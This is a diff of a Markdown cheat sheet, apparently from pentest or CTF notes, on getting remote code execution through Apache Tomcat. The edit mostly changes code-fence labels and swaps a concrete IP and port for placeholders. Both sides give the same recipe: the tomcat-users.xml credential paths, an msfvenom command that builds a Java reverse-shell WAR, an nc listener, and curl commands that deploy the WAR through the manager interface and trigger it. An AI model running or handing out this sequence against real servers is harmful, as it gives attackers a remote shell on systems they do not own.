@@ -4,16 +4,15 @@ date: 2024-7-2
 tags: ["tomcat", "apache", "web server", "war", "java", "rce"]
 ---
 
----
 ### Config Location
 
 <div>
 
-```bash
+```console
 /usr/share/tomcat9/etc/tomcat-users.xml
 ```
 
-```bash
+```console
 /etc/tomcat9/tomcat-users.xml
 ```
 
@@ -29,8 +28,8 @@ tags: ["tomcat", "apache", "web server", "war", "java", "rce"]
 
 <div>
 
-```bash
-msfvenom -p java/shell_reverse_tcp LHOST=10.10.14.10 LPORT=1337 -f war -o revshell.war
+```console
+msfvenom -p java/shell_reverse_tcp LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> -f war -o revshell.war
 ```
 
 </div>
@@ -39,8 +38,8 @@ msfvenom -p java/shell_reverse_tcp LHOST=10.10.14.10 LPORT=1337 -f war -o revshe
 
 <div>
 
-```bash
-rlwrap nc -lvnp 1337
+```console
+rlwrap nc -lvnp <LOCAL_PORT>
 ```
 
 </div>
@@ -51,7 +50,7 @@ rlwrap nc -lvnp 1337
 
 <div>
 
-```bash
+```console
 +--------------------------------------------+
 | Exploit                                    |
 +--------------------------------------------+
@@ -68,12 +67,12 @@ rlwrap nc -lvnp 1337
 
 <div>
 
-```bash
-curl -u '<USERNAME>:<PASSWORD>' http://example.com:8080/manager/text/deploy?path=/revshell --upload-file revshell.war
+```console
+curl -u '<USERNAME>:<PASSWORD>' http://<DOMAIN>:8080/manager/text/deploy?path=/revshell --upload-file revshell.war
 ```
 
-```bash
-curl -s http://example.com:8080/revshell
+```console
+curl -s http://<DOMAIN>:8080/revshell
 ```
 
 </div>
